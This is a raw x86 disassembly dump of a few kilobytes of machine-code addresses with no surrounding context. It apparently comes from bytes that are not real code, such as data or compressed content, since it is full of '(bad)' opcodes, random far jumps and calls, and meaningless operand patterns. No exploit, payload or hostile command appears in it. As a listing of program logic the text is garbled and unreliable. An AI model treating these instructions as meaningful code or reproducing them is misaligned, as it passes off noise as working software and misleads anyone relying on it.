  445df8:	sbb    ecx,0x5553c912
  445dfe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  445dff:	(bad)  
  445e00:	fadd   st(6),st
  445e02:	imul   edi,DWORD PTR [esp+ebp*4],0xfffffffd
  445e06:	jmp    0x6a45e3ca
  445e0b:	inc    esp
  445e0c:	lods   al,BYTE PTR ds:[esi]
  445e0d:	sub    DWORD PTR [edx+0x3c],ebp
  445e10:	mov    ah,0xd
  445e12:	and    dl,dl
  445e14:	fisttp WORD PTR [ecx+0x6b]
  445e17:	fmul   DWORD PTR [ebx]
  445e19:	aad    0x2e
  445e1b:	or     bh,bl
  445e1d:	test   eax,0x5c1bf06b
  445e22:	fistp  WORD PTR [esp+ebp*2+0x9]
  445e26:	push   0xffffffc8
  445e28:	or     edx,edi
  445e2a:	fistp  WORD PTR [eax+eax*1+0x0]
  445e2e:	add    BYTE PTR [eax],al
  445e30:	add    BYTE PTR [ecx+ebp*1+0x12],ch
  445e34:	sar    DWORD PTR [ebx+0x1bc86a57],1
  445e3a:	push   ebp
  445e3b:	or     DWORD PTR [eax],edx
  445e3d:	or     eax,DWORD PTR [ebp+0x9]
  445e40:	add    al,0xb
  445e42:	dec    ebp
  445e43:	or     DWORD PTR [eax],ecx
  445e45:	popa   
  445e46:	jae    0x445e05
  445e48:	(bad)  [ecx+0x72]
  445e4b:	mov    ebp,0x79e28bd8
  445e50:	in     al,dx
  445e51:	jg     0x445e1c
  445e53:	imul   esi,eax,0x67
  445e56:	cmp    BYTE PTR [ecx],cl
  445e58:	or     al,0x1b
  445e5a:	aam    0x6b
  445e5c:	cmp    al,0xb4
  445e5e:	or     ebx,esi
  445e60:	ficom  WORD PTR [ebx-0x74f99f36]
  445e66:	inc    edi
  445e67:	or     DWORD PTR [edi+edi*4],eax
  445e6a:	adc    esp,DWORD PTR [ebx+0x7]
  445e6d:	jnp    0x445e21
  445e6f:	cmp    esp,DWORD PTR [eax]
  445e71:	mov    BYTE PTR [esi+ebx*8+0x1b6e7b39],bl
  445e78:	adc    al,0x8b
  445e7a:	jle    0x445e8f
  445e7c:	adc    BYTE PTR [ebx+0x9],ah
  445e7f:	cld    
  445e80:	aas    
  445e81:	je     0x445e3d
  445e83:	in     al,dx
  445e84:	dec    edi
  445e85:	lods   al,BYTE PTR ds:[esi]
  445e86:	mov    dh,0xa8
  445e88:	int    0xf7
  445e8a:	or     dh,BYTE PTR [ebp+ecx*8-0x70]
  445e8e:	cmp    DWORD PTR [ebp-0x31c61c84],ebx
  445e94:	jl     0x445e96
  445e96:	add    BYTE PTR [eax],al
  445e98:	add    BYTE PTR [eax],al
  445e9a:	fdivr  DWORD PTR [ecx]
  445e9c:	mov    ecx,0xf7c2d249
  445ea1:	mov    bh,0xd4
  445ea3:	test   BYTE PTR [ebx],0x53
  445ea6:	sbb    eax,DWORD PTR [ebx+0x19904017]
  445eac:	in     al,dx
  445ead:	push   esp
  445eae:	popa   
  445eaf:	imul   eax,DWORD PTR [edi],0x5cb27c64
  445eb5:	aaa    
  445eb6:	xchg   esp,eax
  445eb7:	mov    dh,0x5e
  445eb9:	cmp    al,0x98
  445ebb:	cmp    esi,DWORD PTR [edi+edi*8+0x4ecb9a18]
  445ec2:	inc    ecx
  445ec3:	sub    BYTE PTR [edi-0x5374c2b6],0xc5
  445eca:	mov    WORD PTR ds:0xf653d320,fs
  445ed0:	or     dh,BYTE PTR [edi-0x48dd09ac]
  445ed6:	dec    esp
  445ed7:	idiv   BYTE PTR [edx]
  445ed9:	mov    bh,0x54
  445edb:	imul   BYTE PTR [ebx-0x18]
  445ede:	aad    0x39
  445ee0:	jmp    0x445f5d
  445ee2:	aad    0xba
  445ee4:	dec    edi
  445ee5:	ss mov edx,0x8961f7b2
  445eeb:	mov    bl,0xe
  445eed:	jge    0x445f36
  445eef:	loopne 0x445ebf
  445ef1:	mov    WORD PTR [ecx+edi*1+0x4f],ss
  445ef5:	and    eax,0x218ef393
  445efa:	(bad)  
  445efb:	out    0xe,eax
  445efd:	jmp    0x445f02
  445f02:	add    BYTE PTR [eax-0x1244e2f3],ah
  445f08:	mov    eax,0x8493e90f
  445f0d:	daa    
  445f0e:	xor    DWORD PTR [ebp+ebp*4-0xf74547e],ebx
  445f15:	dec    edx
  445f16:	stos   BYTE PTR es:[edi],al
  445f17:	cmp    dh,ch
  445f19:	fnstenv [ebp-0x522611c8]
  445f1f:	sub    dh,ch
  445f21:	fldenv [edx-0x11]
  445f24:	jbe    0x445ebb
  445f26:	jge    0x445f83
  445f28:	out    0x16,eax
  445f2a:	jb     0x445ec0
  445f2c:	fimul  WORD PTR ds:0x4f53c7b1
  445f32:	frstor [edx+0x74]
  445f35:	sbb    DWORD PTR [esi],esi
  445f37:	inc    ebp
  445f38:	and    al,0x1c
  445f3a:	cmp    eax,DWORD PTR [edi+0x2f]
  445f3d:	push   edx
  445f3e:	icebp  
  445f3f:	fwait
  445f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  445f41:	loopne 0x445f22
  445f43:	call   0x1a7a:0x1add6b39
  445f4a:	add    ah,BYTE PTR [ebp-0x238de861]
  445f50:	mov    edx,0x27bb100d
  445f55:	pop    esp
  445f56:	jecxz  0x445f29
  445f58:	das    
  445f59:	into   
  445f5a:	shr    DWORD PTR [edx-0x5ceea40c],1
  445f60:	repnz dec eax
  445f62:	mov    bh,0xda
  445f64:	jge    0x445f33
  445f66:	add    DWORD PTR [eax],0x0
  445f69:	add    BYTE PTR [eax],al
  445f6b:	add    BYTE PTR [ebx-0x74],bl
  445f6e:	mov    dh,0x0
  445f70:	jno    0x445f56
  445f72:	push   cs
  445f73:	call   0x530e5d
  445f78:	mov    edx,0x6f00e291
  445f7d:	scas   al,BYTE PTR es:[edi]
  445f7e:	push   cs
  445f7f:	inc    eax
  445f80:	sub    DWORD PTR [esi-0xa],esi
  445f83:	popa   
  445f84:	dec    esi
  445f85:	or     eax,0xefb459e1
  445f8a:	jns    0x445fc9
  445f8c:	mov    dl,0x72
  445f8e:	push   ss
  445f8f:	sub    esp,edi
  445f91:	jg     0x445feb
  445f93:	call   0x256c01
  445f98:	mov    al,ds:0xc5c06b75
  445f9d:	(bad)  
  445f9e:	xchg   ebp,eax
  445f9f:	inc    eax
  445fa0:	(bad)
  445fa3:	pop    ds
  445fa4:	push   es
  445fa5:	add    BYTE PTR [ebp+0x2b64f8e0],cl
  445fab:	cld    
  445fac:	prefetch (bad)
  445fad:	or     eax,0xd002ffe1
  445fb2:	xchg   ebp,eax
  445fb3:	inc    ebp
  445fb4:	sbb    eax,0xb98b0ea9
  445fb9:	loopne 0x445f92
  445fbb:	cmp    eax,0xc00eafb4
  445fc0:	mov    esi,0x788bcf33
  445fc5:	lock xchg esp,eax
  445fc7:	gs push ecx
  445fc9:	fs sub edi,esp
  445fcc:	dec    edi
  445fcd:	or     al,0xe1
  445fcf:	inc    DWORD PTR [eax]
  445fd1:	add    BYTE PTR [eax],al
  445fd3:	add    BYTE PTR [eax],al
  445fd5:	call   0xeaf:0x797af5ef
  445fdc:	ret    
  445fdd:	repnz jecxz 0x445fea
  445fe0:	or     dl,dh
  445fe2:	fisttp DWORD PTR [edx]
  445fe4:	adc    BYTE PTR [edx+0x554c9567],al
  445fea:	sbb    edi,DWORD PTR [edx+0x9]
  445fed:	nop
  445fee:	nop
  445fef:	sub    DWORD PTR [esp+edx*4],ebx
  445ff2:	mov    esp,0x1980c2f2
  445ff7:	cmp    al,0xef
  445ff9:	xor    DWORD PTR [eax-0xa33742b],esp
  445fff:	in     al,0xee
  446001:	mov    ah,0xed
  446003:	sbb    BYTE PTR [ebx],al
  446005:	pop    eax
  446006:	mov    al,ds:0xfc981c4e
  44600b:	in     al,dx
  44600c:	add    eax,DWORD PTR [ebx-0x20]
  44600f:	int3   
  446010:	adc    BYTE PTR [eax-0x33f08e8f],dl
  446016:	sbb    DWORD PTR [ecx-0x9],ecx
  446019:	lds    ebx,FWORD PTR [ecx]
  44601b:	or     eax,0x4e909000
  446020:	sbb    al,0xa0
  446022:	xchg   edx,eax
  446023:	inc    esi
  446024:	sbb    al,0xa0
  446026:	sahf   
  446027:	inc    esi
  446028:	sbb    al,0x80
  44602a:	add    ch,ch
  44602c:	push   ebx
  44602d:	ds in  al,0xad
  446030:	cmp    al,0x70
  446032:	int    0x12
  446034:	xor    DWORD PTR [ebp+0x2d],ecx
  446037:	pop    ds
  446038:	mov    ebp,0x0
  44603d:	add    BYTE PTR [eax-0x5e],ah
  446040:	dec    ecx
  446041:	call   0x8c39860d
  446046:	push   ebp
  446047:	xchg   ebp,eax
  446048:	stos   DWORD PTR es:[edi],eax
  446049:	cmp    eax,0xf7f38ab4
  44604e:	scas   eax,DWORD PTR es:[edi]
  44604f:	mov    eax,ds:0x5615f829
  446054:	fstp   QWORD PTR [ebx+esi*8+0x18]
  446058:	or     eax,0x67d89000
  44605d:	inc    ebp
  44605e:	cmp    al,0x63
  446061:	add    eax,0xd0b90
  446066:	fnstenv [eax]
  446068:	push   edx
  446069:	push   esi
  44606a:	(bad)  [edx-0x7c3a20a4]
  446070:	xor    al,0x79
  446072:	pop    edi
  446073:	mov    BYTE PTR [eax+ebx*8+0x67],ch
  446077:	test   al,0xe3
  446079:	in     al,0xe5
  44607b:	ret    0x6f10
  44607e:	xchg   esp,eax
  44607f:	and    DWORD PTR [edx-0x5],esp
  446082:	scas   eax,DWORD PTR es:[edi]
  446083:	jb     0x446078
  446085:	aas    
  446086:	nop
  446087:	mov    dh,BYTE PTR [ebx-0x404d8b9d]
  44608d:	jo     0x4460b9
  44608f:	and    cl,al
  446091:	and    ah,0xba
  446094:	and    al,cl
  446096:	daa    
  446097:	fsub   DWORD PTR [edi+0xd]
  44609a:	shl    BYTE PTR [edx+0x42d3c15c],1
  4460a0:	aas    
  4460a1:	mov    BYTE PTR [eax],al
  4460a3:	add    BYTE PTR [eax],al
  4460a5:	add    BYTE PTR [eax],al
  4460a7:	test   al,0x76
  4460a9:	neg    DWORD PTR [edi+0x31]
  4460ac:	mov    bl,0xf7
  4460ae:	add    edx,DWORD PTR [eax-0x73c0a37e]
  4460b4:	ret    0x575e
  4460b7:	test   dl,al
  4460b9:	jb     0x446112
  4460bb:	jl     0x44607f
  4460bd:	int3   
  4460be:	jecxz  0x446103
  4460c0:	mov    BYTE PTR [eax],cl
  4460c2:	jns    0x446051
  4460c4:	sbb    bl,BYTE PTR [esi+0x5e]
  4460c7:	mov    eax,0xc43e6c82
  4460cc:	stc    
  4460cd:	xor    eax,ebp
  4460cf:	mov    edi,0x19e47021
  4460d4:	js     0x446145
  4460d6:	jbe    0x44613d
  4460d8:	and    bl,bl
  4460da:	mov    al,ds:0x3f7b290
  4460df:	shr    DWORD PTR ds:0x2becf3a2,cl
  4460e5:	cli    
  4460e6:	add    edx,DWORD PTR [eax-0x3516f14e]
  4460ec:	mov    DWORD PTR [eax-0x6e],ecx
  4460ef:	cmp    al,BYTE PTR [ebx-0x9d8ca33]
  4460f5:	fldcw  WORD PTR ds:0xbad9f61f
  4460fb:	int    0x2d
  4460fd:	push   edx
  4460fe:	lds    ecx,FWORD PTR [ebx-0x64833153]
  446104:	sub    eax,0x2d97c55a
  446109:	push   edx
  44610a:	int    0x0
  44610c:	add    BYTE PTR [eax],al
  44610e:	add    BYTE PTR [eax],al
  446110:	mov    ds:0x41f6bce5,eax
  446115:	sub    eax,0xbed872c6
  44611a:	sbb    dl,dh
  44611c:	cmp    eax,0xd5c2bd2d
  446121:	sub    eax,0xbed062d6
  446126:	add    dh,BYTE PTR [edx-0x38]
  446129:	mov    esi,0xbe5871fe
  44612e:	sbb    bl,BYTE PTR [eax-0x673afd13]
  446134:	out    0x2,al
  446136:	(bad)  
  446137:	repnz fmul QWORD PTR [esi+0x2cbf96e2]
  44613e:	ficomp WORD PTR [esi+0x6206be68]
  446144:	les    ebp,FWORD PTR [edx+edx*2]
  446147:	int    0xc7
  446149:	(bad)  
  44614b:	jmp    0xbe87:0xb218a3fc
  446152:	(bad)  
  446153:	cmc    
  446154:	mov    esp,DWORD PTR [ecx+edx*1+0x1abe5822]
  44615b:	xlat   BYTE PTR ds:[ebx]
  44615c:	mov    WORD PTR [eax+0x1d],?
  44615f:	cmp    ecx,DWORD PTR [edi]
  446161:	pusha  
  446162:	dec    eax
  446163:	mov    dl,0xcd
  446165:	ror    DWORD PTR [esi],0x0
  446168:	lds    eax,FWORD PTR [edx]
  44616a:	ror    ah,cl
  44616c:	mov    ch,0x2
  44616e:	ror    ah,cl
  446170:	sbb    BYTE PTR [ebx+0x52],al
  446173:	and    al,0x0
  446175:	add    BYTE PTR [eax],al
  446177:	add    BYTE PTR [eax],al
  446179:	ins    DWORD PTR es:[edi],dx
  44617a:	rcl    esi,1
  44617c:	sbb    edi,DWORD PTR [ecx-0x5edc4205]
  446182:	das    
  446183:	stos   BYTE PTR es:[edi],al
  446184:	and    eax,0xffe10469
  446189:	inc    edx
  44618a:	in     al,dx
  44618b:	pop    ebx
  44618c:	or     al,dl
  44618e:	cmc    
  44618f:	inc    esi
  446190:	xchg   esp,eax
  446191:	ret    0x97b6
  446194:	add    al,0x4d
  446196:	stc    
  446197:	xor    al,BYTE PTR [eax]
  446199:	pop    ecx
  44619a:	mov    ah,0xe
  44619c:	test   DWORD PTR [ecx],edi
  44619e:	adc    edi,esi
  4461a0:	int3   
  4461a1:	inc    esi
  4461a2:	retf   
  4461a3:	pop    edx
  4461a4:	push   ss
  4461a5:	imul   esi,DWORD PTR [esi-0x100a332e],0x14d7ccd1
  4461af:	loope  0x4461b0
  4461b1:	stc    
  4461b2:	mov    bl,0xe
  4461b4:	add    BYTE PTR [ecx],ah
  4461b6:	adc    eax,0xb3e9ffe1
  4461bb:	push   cs
  4461bc:	add    BYTE PTR [edi],dh
  4461be:	adc    eax,0x1a23ffe1
  4461c3:	and    eax,0x251a2700
  4461c8:	add    cl,ch
  4461ca:	mov    bl,0xe
  4461cc:	add    BYTE PTR [esi],dl
  4461ce:	adc    eax,0x501effe1
  4461d3:	dec    edi
  4461d4:	add    BYTE PTR [edx],ah
  4461d6:	push   eax
  4461d7:	dec    edi
  4461d8:	add    BYTE PTR [ecx+0xeb3],ch
  4461de:	add    BYTE PTR [eax],al
  4461e0:	add    BYTE PTR [eax],al
  4461e2:	ss adc al,0xe1
  4461e5:	call   DWORD PTR [esi-0x6fffb0ad]
  4461eb:	mov    esp,0x99041ad
  4461f0:	or     eax,0xec789000
  4461f5:	test   DWORD PTR [edi-0x6fbe09ff],0x9041f5f5
  4461ff:	or     DWORD PTR ds:0xecd89000,ecx
  446205:	mul    DWORD PTR [edi-0x7f]
  446208:	mov    esp,0xbc759042
  44620d:	inc    edx
  44620e:	nop
  44620f:	or     DWORD PTR ds:0xecb89000,ecx
  446215:	test   DWORD PTR [edi-0x18],0xe49042be
  44621c:	mov    esi,0xd099042
  446221:	add    BYTE PTR [eax+0x27f7ef18],dl
  446227:	jne    0x4461e8
  446229:	inc    edx
  44622a:	nop
  44622b:	jno    0x4461ec
  44622d:	inc    edx
  44622e:	nop
  44622f:	or     DWORD PTR ds:0xeef89000,ecx
  446235:	test   DWORD PTR [edi],0x9042be1b
  44623b:	pop    ds
  44623c:	mov    esi,0xd099042
  446241:	add    BYTE PTR [eax+0xf7ef58],dl
  446247:	add    BYTE PTR [eax],al
  446249:	add    BYTE PTR [eax],al
  44624b:	out    0x71,eax
  44624d:	mov    esp,0xbce69042
  446252:	inc    edx
  446253:	nop
  446254:	or     DWORD PTR ds:0xef389000,ecx
  44625a:	test   edi,0x9042bf07
  446260:	add    al,0xbf
  446262:	inc    edx
  446263:	nop
  446264:	or     DWORD PTR ds:0x70b29000,ecx
  44626a:	loope  0x44620b
  44626c:	push   ds
  44626d:	push   eax
  44626e:	iret   
  44626f:	push   edx
  446270:	mov    dl,0x4c
  446272:	iret   
  446273:	push   edx
  446274:	mov    dl,0xf7
  446276:	add    edx,DWORD PTR [eax+0x7fe150b2]
  44627c:	push   ds
  44627d:	int3   
  44627e:	into   
  44627f:	shl    BYTE PTR [edx-0x4d2d3160],cl
  446285:	test   DWORD PTR [ebx],0xe130b290
  44628b:	pop    edi
  44628c:	push   ds
  44628d:	fdivr  DWORD PTR [edx+edx*8-0x2d433b4e]
  446294:	mov    dl,0xf7
  446296:	add    edx,DWORD PTR [eax+0x3fe110b2]
  44629c:	push   ds
  44629d:	jo     0x44625d
  44629f:	shl    BYTE PTR [edx-0x4d2d4194],cl
  4462a5:	test   DWORD PTR [ebx],0xe0f0b290
  4462ab:	pop    ds
  4462ac:	push   ds
  4462ad:	in     eax,dx
  4462ae:	mov    ebx,0x0
  4462b3:	add    dl,dl
  4462b5:	mov    dl,0xc1
  4462b7:	mov    ebx,0x3f7b2d2
  4462bc:	nop
  4462bd:	mov    dl,0xd0
  4462bf:	loopne 0x4462c0
  4462c1:	sbb    eax,0xb252bc7c
  4462c6:	nop
  4462c7:	mov    esp,0x3f7b252
  4462cc:	nop
  4462cd:	mov    dl,0xb0
  4462cf:	loopne 0x4462b0
  4462d1:	sbb    eax,0xb252ba9d
  4462d6:	mov    cl,0xba
  4462d8:	push   edx
  4462d9:	mov    dl,0xf7
  4462db:	add    edx,DWORD PTR [eax-0x401f6f4e]
  4462e1:	sbb    eax,0xb252d36a
  4462e6:	push   cs
  4462e7:	call   0xe952d3ce
  4462ec:	xchg   ebx,eax
  4462ed:	mov    dl,0xe
  4462ef:	data16 mov al,0x25
  4462f2:	jmp    0xeb528ac
  4462f7:	mov    cl,0xbd
  4462f9:	jo     0x446309
  4462fb:	jmp    0x46531593
  446300:	jo     0x446327
  446302:	jmp    0xeb5edd2
  446307:	iret   
  446308:	mov    dh,BYTE PTR [ecx+0xe]
  44630b:	jmp    0xe95315a3
  446310:	xchg   ebx,eax
  446311:	mov    dl,0xe
  446313:	jmp    0xbc5315ab
  446318:	add    BYTE PTR [eax],al
  44631a:	add    BYTE PTR [eax],al
  44631c:	add    BYTE PTR [esi+edx*1],cl
  44631f:	xor    DWORD PTR [eax+0x36],esp
  446322:	cmp    DWORD PTR [edi+ebx*4],0x3b
  446326:	xor    bh,dh
  446328:	call   0xe943f5c0
  44632d:	xchg   ebx,eax
  44632e:	xchg   bh,bh
  446330:	call   0xe943ddc8
  446335:	xchg   ebx,eax
  446336:	outs   dx,BYTE PTR ds:[esi]
  446337:	(bad)  
  446338:	call   0xe943e1d0
  44633d:	xchg   ebx,eax
  44633e:	inc    esi
  44633f:	(bad)  
  446340:	call   0xe9438dd8
  446345:	xchg   ebx,eax
  446346:	sahf   
  446347:	(bad)  
  446348:	call   0xe943d5e0
  44634d:	xchg   ebx,eax
  44634e:	out    0xff,al
  446350:	call   0xe9443de8
  446355:	xchg   ebx,eax
  446356:	into   
  446357:	(bad)  
  446358:	call   0xe94441f0
  44635d:	xchg   ebx,eax
  44635e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44635f:	(bad)  
  446360:	call   0x43edf8
  446365:	mov    ecx,0xa91a27b0
  44636a:	mov    al,0x2e
  44636c:	adc    DWORD PTR [ecx-0x46eefd50],ebp
  446372:	mov    al,0x6
  446374:	adc    DWORD PTR [ecx-0x56eee550],edi
  44637a:	mov    al,0xa
  44637c:	adc    DWORD PTR [ecx+0x1142b0],ebp
  446382:	add    BYTE PTR [eax],al
  446384:	add    BYTE PTR [eax],al
  446386:	jns    0x446338
  446388:	push   esi
  446389:	adc    DWORD PTR [ecx-0x50],edi
  44638c:	sub    dl,BYTE PTR [ecx]
  44638e:	imul   esi,DWORD PTR [eax-0x4f96eef2],0xb07910e2
  446398:	out    0x10,al
  44639a:	jns    0x44634c
  44639c:	cli    
  44639d:	adc    BYTE PTR [ecx-0x50],ch
  4463a0:	jmp    0x3911:0x22b06910
  4463a7:	mov    al,0x36
  4463a9:	adc    DWORD PTR [ecx],edi
  4463ab:	mov    al,0xa
  4463ad:	adc    DWORD PTR [ecx],ebp
  4463af:	mov    al,0xee
  4463b1:	adc    BYTE PTR [ecx],ch
  4463b3:	mov    al,0xc2
  4463b5:	adc    BYTE PTR [ecx],bh
  4463b7:	mov    al,0xc6
  4463b9:	adc    BYTE PTR [ecx],bh
  4463bb:	mov    al,0xda
  4463bd:	adc    BYTE PTR [ecx],ch
  4463bf:	mov    al,0xca
  4463c1:	adc    BYTE PTR [ecx],ch
  4463c3:	mov    al,0x2
  4463c5:	adc    ecx,edi
  4463c7:	scas   eax,DWORD PTR es:[edi]
  4463c8:	mov    BYTE PTR [ecx],dl
  4463ca:	stc    
  4463cb:	scas   eax,DWORD PTR es:[edi]
  4463cc:	jmp    0xe910:0xceafe910
  4463d3:	scas   eax,DWORD PTR es:[edi]
  4463d4:	mov    ds:0xa6aff910,al
  4463d9:	adc    cl,bh
  4463db:	scas   eax,DWORD PTR es:[edi]
  4463dc:	mov    edx,0xaaafe910
  4463e1:	adc    BYTE PTR [eax-0x5f0bf2f7],dl
  4463e7:	or     DWORD PTR ds:0x7e,ecx
  4463ed:	add    BYTE PTR [eax],al
  4463ef:	mov    eax,ds:0xa0dc0d09
  4463f4:	or     DWORD PTR ds:0xd09a0a0,ecx
  4463fa:	xchg   esp,eax
  4463fb:	or     BYTE PTR [ecx],0xd
  4463fe:	cwde   
  4463ff:	or     BYTE PTR [ecx],0xd
  446402:	mov    WORD PTR [eax-0x7f63f2f7],es
  446408:	or     DWORD PTR ds:0xd09a0d4,ecx
  44640e:	pop    esi
  44640f:	mov    eax,ds:0xa0bc0d09
  446414:	or     DWORD PTR ds:0xd09a080,ecx
  44641a:	je     0x44639c
  44641c:	or     DWORD PTR ds:0xd098078,ecx
  446422:	ins    BYTE PTR es:[edi],dx
  446423:	or     BYTE PTR [ecx],0xd
  446426:	jl     0x4463a8
  446428:	or     DWORD PTR ds:0xd09a0b4,ecx
  44642e:	mov    eax,ds:0xa09c0d09
  446434:	or     DWORD PTR ds:0xd09a110,ecx
  44643a:	add    al,0x81
  44643c:	or     DWORD PTR ds:0xd098108,ecx
  446442:	cld    
  446443:	or     BYTE PTR [ecx],0xd
  446446:	add    BYTE PTR [ecx-0x5f0bf2f7],al
  44644c:	or     DWORD PTR ds:0xd09a0f8,ecx
  446452:	in     al,dx
  446453:	add    BYTE PTR [eax],al
  446455:	add    BYTE PTR [eax],al
  446457:	add    BYTE PTR [eax-0x5f43f2f7],ah
  44645d:	or     DWORD PTR ds:0xd0980c0,ecx
  446463:	mov    ah,0x80
  446465:	mov    dl,0xf7
  446467:	add    ebx,DWORD PTR [eax]
  446469:	ret    0x3f7
  44646c:	and    al,0xc2
  44646e:	test   DWORD PTR [ebx],0x3f7c200
  446474:	in     al,dx
  446475:	shl    edi,0x3
  446478:	call   0x80485c3e
  44647d:	ret    0x3f7
  446480:	je     0x446444
  446482:	test   DWORD PTR [ebx],0x3f7c278
  446488:	jl     0x44644c
  44648a:	test   DWORD PTR [ebx],0x3f7c270
  446490:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  446491:	ret    0x3f7
  446494:	test   al,0xc2
  446496:	test   DWORD PTR [ebx],0x3f7c28c
  44649c:	mov    al,ds:0x9403f7c2
  4464a1:	ret    0x3f7
  4464a4:	cwde   
  4464a5:	ret    0x3f7
  4464a8:	pop    esp
  4464a9:	stos   BYTE PTR es:[edi],al
  4464aa:	test   DWORD PTR [ebx],0x3f7c290
  4464b0:	inc    esp
  4464b1:	stos   BYTE PTR es:[edi],al
  4464b2:	test   DWORD PTR [ebx],0x3f7aa48
  4464b8:	sub    al,0xaa
  4464ba:	test   DWORD PTR [ebx],0x0
  4464c0:	add    BYTE PTR [eax-0x56],al
  4464c3:	test   DWORD PTR [ebx],0x3f7aa34
  4464c9:	mov    es,ebx
  4464cb:	test   DWORD PTR [ebx],0x3f7aa4c
  4464d1:	out    dx,al
  4464d2:	ret    0x3f7
  4464d5:	cmp    al,bl
  4464d7:	test   DWORD PTR [ebx],0x3f7c23f
  4464dd:	hlt    
  4464de:	shl    edi,0x3
  4464e1:	xchg   ecx,eax
  4464e2:	les    ecx,FWORD PTR [esi]
  4464e4:	jmp    0xe9439b7c
  4464e9:	xchg   ebx,eax
  4464ea:	out    dx,al
  4464eb:	sbb    cl,ch
  4464ed:	xchg   ebx,eax
  4464ee:	sar    esi,1
  4464f0:	call   0xe95d5788
  4464f5:	xchg   ebx,eax
  4464f6:	pop    esi
  4464f7:	sbb    ecx,ebp
  4464f9:	xchg   ebx,eax
  4464fa:	pop    edx
  4464fb:	sbb    ecx,ebp
  4464fd:	xchg   ebx,eax
  4464fe:	inc    esi
  4464ff:	sbb    ecx,ebp
  446501:	xchg   ebx,eax
  446502:	inc    esi
  446503:	sbb    ecx,ebp
  446505:	xchg   ebx,eax
  446506:	bound  ebx,QWORD PTR [ecx]
  446508:	jmp    0xe95db3a0
  44650d:	xchg   ebx,eax
  44650e:	dec    edx
  44650f:	sbb    ecx,ebp
  446511:	xchg   ebx,eax
  446512:	ss sbb ecx,ebp
  446515:	xchg   ebx,eax
  446516:	push   edx
  446517:	sbb    ecx,ebp
  446519:	xchg   ebx,eax
  44651a:	ds sbb ecx,ebp
  44651d:	xchg   ebx,eax
  44651e:	cmp    bl,BYTE PTR [ecx]
  446520:	jmp    0xe95d8bb8
  446525:	add    BYTE PTR [eax],al
  446527:	add    BYTE PTR [eax],al
  446529:	add    BYTE PTR [ebx-0x6c16e6be],dl
  44652f:	cs sbb ecx,ebp
  446532:	xchg   ebx,eax
  446533:	sub    bl,BYTE PTR [ecx]
  446535:	jmp    0xe95dfbcd
  44653a:	xchg   ebx,eax
  44653b:	xor    bl,BYTE PTR [ecx]
  44653d:	jmp    0xe95e03d5
  446542:	xchg   ebx,eax
  446543:	call   0xe918:0xfd93e919
  44654a:	xchg   ebx,eax
  44654b:	clc    
  44654c:	(bad)  
  44654d:	call   0xe94353e5
  446552:	xchg   ebx,eax
  446553:	icebp  
  446554:	sbb    cl,ch
  446556:	xchg   ebx,eax
  446557:	sbb    BYTE PTR [ecx],0xe9
  44655a:	xchg   ebx,eax
  44655b:	outs   dx,BYTE PTR ds:[esi]
  44655c:	sbb    ecx,ebp
  44655e:	xchg   ebx,eax
  44655f:	push   0x19
  446561:	add    cl,ch
  446563:	mov    ah,0x2a
  446565:	psubsw mm6,QWORD PTR [esi+ecx*2+0x22b4f90f]
  44656d:	psubw  mm6,QWORD PTR [esi+eiz*1+0x3ab4e90f]
  446575:	psubsw mm6,QWORD PTR [esi+ebx*1+0x32b4b90f]
  44657d:	ud1    esi,DWORD PTR [esi+esi*1+0x50b4a90f]
  446585:	adc    DWORD PTR [ecx-0x46f0e14c],ebp
  44658b:	mov    ah,0x32
  44658d:	sldt   WORD PTR [eax]
  446590:	add    BYTE PTR [eax],al
  446592:	add    BYTE PTR [ecx-0x56f0c94c],bh
  446598:	mov    ah,0xa
  44659a:	pop    gs
  44659c:	mov    ah,0x2e
  44659e:	vmwrite esi,DWORD PTR [edx+eax*1+0x6b4790f]
  4465a6:	punpckhwd mm6,QWORD PTR [edx+ebx*1-0x14b96f1]
  4465ae:	push   cs
  4465af:	jns    0x446565
  4465b1:	adc    cl,BYTE PTR [edi]
  4465b3:	jns    0x446569
  4465b5:	int    0x10
  4465b7:	imul   esi,DWORD PTR [edx+ebp*8+0xeb4690e],0xe2b4390f
  4465c2:	push   cs
  4465c3:	cmp    DWORD PTR [esi+eiz*8-0x54bd6f2],esi
  4465ca:	push   cs
  4465cb:	sub    DWORD PTR [edx+ebp*1+0x3eb43910],esi
  4465d2:	adc    BYTE PTR [ecx],bh
  4465d4:	mov    ah,0x22
  4465d6:	adc    BYTE PTR [ecx],ch
  4465d8:	mov    ah,0x56
  4465da:	adc    BYTE PTR [ecx],ch
  4465dc:	mov    ah,0xee
  4465de:	push   cs
  4465df:	nop
  4465e0:	or     DWORD PTR ds:0xd0996d4,ecx
  4465e6:	fmul   DWORD PTR [esi-0x7933f2f7]
  4465ec:	or     DWORD PTR ds:0xd099ecc,ecx
  4465f2:	add    al,0x97
  4465f4:	or     DWORD PTR ds:0xc8,ecx
  4465fa:	add    BYTE PTR [eax],al
  4465fc:	mov    cs,WORD PTR [ecx]
  4465fe:	or     eax,0xd0986bc
  446603:	rcr    BYTE PTR [esi-0x694bf2f7],0x9
  44660a:	or     eax,0xd098eb8
  44660f:	lods   al,BYTE PTR ds:[esi]
  446610:	xchg   BYTE PTR [ecx],cl
  446612:	or     eax,0xd099eac
  446617:	mov    al,0x96
  446619:	or     DWORD PTR ds:0xd098ea4,ecx
  44661f:	test   al,0x86
  446621:	or     DWORD PTR ds:0xd099e9c,ecx
  446627:	mov    al,ds:0x940d0996
  44662c:	mov    cs,WORD PTR [ecx]
  44662e:	or     eax,0xd098698
  446633:	loopne 0x4465d3
  446635:	or     DWORD PTR ds:0xd0996d4,ecx
  44663b:	fmul   DWORD PTR [esi-0x7933f2f7]
  446641:	or     DWORD PTR ds:0xd099ed0,ecx
  446647:	les    edx,FWORD PTR [esi-0x7137f2f7]
  44664d:	or     DWORD PTR ds:0xd0986bc,ecx
  446653:	fistp  DWORD PTR [esi-0x6930f2f7]
  446659:	or     DWORD PTR ds:0xf7b28faf,ecx
  44665f:	add    eax,DWORD PTR [eax]
  446661:	add    BYTE PTR [eax],al
  446663:	add    BYTE PTR [eax],al
  446665:	mov    ah,0xa8
  446667:	test   DWORD PTR [ebx],0x3f7a78e
  44666d:	adc    ah,BYTE PTR [edi-0x582cfc09]
  446673:	test   DWORD PTR [ebx],0x3f7a7b5
  446679:	je     0x446622
  44667b:	test   DWORD PTR [ebx],0x3f7a84c
  446681:	(bad)  
  446683:	test   DWORD PTR [ebx],0x3f7a894
  446689:	push   eax
